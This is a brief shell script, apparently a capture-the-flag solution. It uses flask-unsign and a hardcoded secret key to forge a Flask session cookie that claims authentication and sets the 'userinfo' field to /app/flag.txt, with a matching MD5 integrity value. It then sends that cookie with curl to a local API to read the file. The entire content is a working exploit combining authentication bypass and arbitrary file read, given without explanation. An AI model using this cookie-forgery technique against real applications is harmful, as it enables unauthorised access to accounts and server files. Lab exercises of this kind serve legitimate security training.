python3 -m pip install flask-unsign

SESS=$(flask-unsign --sign --cookie "{'auth': True, 'integrity': '$(echo -n 'saltintegrity/app/flag.txt' | md5sum | awk '{ print $1 }')', 'userinfo': '/app/flag.txt'}" --secret 'veryveryverysecuresecretkeykeykeykey')

curl http://127.0.0.1:8004/api/user_data --cookie "session=$SESS"
